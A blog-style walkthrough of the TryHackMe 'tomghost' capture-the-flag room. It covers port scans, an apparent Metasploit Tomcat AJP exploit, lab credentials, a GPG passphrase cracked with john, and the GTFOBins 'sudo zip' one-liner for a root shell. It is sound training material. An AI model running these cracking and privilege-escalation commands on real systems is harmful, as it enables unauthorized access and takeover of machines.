---
title: "tomghost"
date: 2024-12-24
draft: false
description: TryHackMe's Good Room
Tags:
- TryHackMe
- Linux
- Easy
---



## Enumeration

```
 rustscan -a 10.10.177.90
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/k21/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.177.90:53
Open 10.10.177.90:22
Open 10.10.177.90:8009
Open 10.10.177.90:8080
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 15:03 +0545
Initiating Ping Scan at 15:03
Scanning 10.10.177.90 [4 ports]
Completed Ping Scan at 15:03, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:03
Completed Parallel DNS resolution of 1 host. at 15:03, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:03
Scanning 10.10.177.90 (10.10.177.90) [4 ports]
Discovered open port 22/tcp on 10.10.177.90
Discovered open port 8080/tcp on 10.10.177.90
Discovered open port 8009/tcp on 10.10.177.90
Discovered open port 53/tcp on 10.10.177.90
Completed SYN Stealth Scan at 15:03, 0.20s elapsed (4 total ports)
Nmap scan report for 10.10.177.90 (10.10.177.90)
Host is up, received echo-reply ttl 60 (0.17s latency).
Scanned at 2025-02-12 15:03:21 +0545 for 0s

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 60
53/tcp   open  domain     syn-ack ttl 60
8009/tcp open  ajp13      syn-ack ttl 60
8080/tcp open  http-proxy syn-ack ttl 60

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (204B)


```

```
 nmap -sVC 10.10.177.90
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 15:02 +0545
Nmap scan report for 10.10.177.90 (10.10.177.90)
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.68 seconds

```

Hmm I can see this too.
![](Pasted%20image%2020250212150938.png)
Hmm I just searched for a exploit of `# Apache Tomcat/9.0.30`.
Hoping if we find anything special and it worked.
![](Pasted%20image%2020250212151117.png)

So it is metasploit exploit.
I searched on msfconsole for making it simple.
![](Pasted%20image%2020250212151531.png)
And exploited it.
![](Pasted%20image%2020250212151557.png)
Hmm we got the username and password.
Hmmm.
`skyfuck:8730281lkjlkjdqlksalks`

![](Pasted%20image%2020250212151837.png)
And it worked on ssh.
![](Pasted%20image%2020250212152050.png)

Now lets do privelege escalation.
And found few things.
![](Pasted%20image%2020250212152257.png)
Hmmmm.
Now we can import that private gpg key in `tryhackme.asc`.
`gpg --import tryhackme.asc`
After this,
we can check this.
`gpg --list-secret-keys`
And do this.
` gpg --decrypt credential.pgp`

And it should be decrypted but there is a twist.
![](Pasted%20image%2020250212152808.png)
Its asking for a passphrase.
Hmmmm.


Then,I downloaded that both file to my host.
I used john to get hash and crack passphrase.
`gpg2john tryhackme.asc > hash.txt`
![](Pasted%20image%2020250212154903.png)
And simply cracked with john.
`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt `
![](Pasted%20image%2020250212154941.png)
`alexandru`

And we decrypted that `credential.pgp`.
![](Pasted%20image%2020250212155130.png)
`merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`
![](Pasted%20image%2020250212155234.png)

Hmm now lets try to become root.
And we can see something.
![](Pasted%20image%2020250212155329.png)
Now I immediately go to.
[[https://gtfobins.github.io/gtfobins/zip/#sudo]]

And got this.
```
Sudo(https://gtfobins.github.io/gtfobins/zip/#sudo)

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

    TF=$(mktemp -u)
    sudo zip $TF /etc/hosts -T -TT 'sh #'
    sudo rm $TF

```

![](Pasted%20image%2020250212155617.png)
And exploited this and got root.
![](Pasted%20image%2020250212155645.png)

And done.
![](Pasted%20image%2020250212155753.png)
